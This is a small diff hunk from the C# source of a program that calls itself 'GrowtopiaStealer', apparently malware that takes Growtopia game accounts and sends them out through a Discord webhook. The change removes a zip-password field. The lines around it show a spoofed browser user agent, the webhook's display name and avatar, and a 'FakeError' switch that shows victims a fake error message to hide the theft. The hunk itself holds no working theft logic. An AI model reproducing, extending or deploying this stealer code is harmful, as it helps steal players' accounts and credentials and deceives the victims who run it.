@@ -11,7 +11,6 @@ public class DiscordWebhook // https://github.com/TheC0mpany/GrowtopiaStealer th
     private static string defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     public static string defaultUserName = "GrowtopiaStealer | TheC0mpany";
     public static string defaultAvatar = "https://i.imgur.com/2Via1dY.jpg"; // Avatar
-    public static string zipPass = "1";
 
     //Fake error
     public static bool FakeError = false; //Set true to show fake error
